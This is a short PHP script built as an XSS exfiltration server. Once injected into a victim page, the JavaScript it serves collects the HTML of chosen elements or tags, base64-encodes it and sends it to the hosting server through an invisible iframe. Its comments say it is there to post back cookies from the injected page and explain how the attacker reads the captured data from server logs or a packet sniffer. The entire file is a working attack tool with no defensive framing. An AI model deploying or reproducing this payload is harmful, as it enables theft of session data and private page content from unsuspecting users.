<?php
  header( "Content-type: text/javascript" );
  // For hosting on a remote web service in order to post back cookies from the injected page
  // Either pull the data out of logs or see the decoded cookie in the response if running a packet sniffer on the host
  $url = "http://".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
  echo "// $url\n";
  if( !isset( $_GET["c"] ) ){
    echo "/*\n Inject with:\n ".$url."?id=userDiv or ".$url."?tag=ul\n";
    echo " Where id is the id of an element to be grabbed or tag is the name of all tags to be grabbed. Defaults to tag=body\n*/\n\n";
    if( !empty( $_GET["id"] ) ){
      echo "var content = document.getElementById('".$_GET["id"]."').outerHTML;\n";
    }else{
      if( empty( $_GET["tag"] ) ) $_GET["tag"] = "body";
      echo "var content = '';\n";
      echo "var col = document.getElementsByTagName('".$_GET["tag"]."');\n";
      echo "for( var i=0; i<col.length; i++ ){ content += col[i].outerHTML + '\\n'; }\n";
    }
?>
var url = "<?php echo $url; ?>?c=" + btoa(content);
f = document.createElement('iframe');
f.src = url;
document.getElementsByTagName('body')[0].appendChild(f);
<?php }else{
  echo "/*\n".base64_decode( $_GET["c"] )."\n*/\n";
}?>
